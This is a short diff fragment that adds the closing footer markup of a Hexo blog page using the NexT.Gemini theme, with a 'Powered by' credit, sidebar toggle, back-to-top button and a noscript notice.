+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
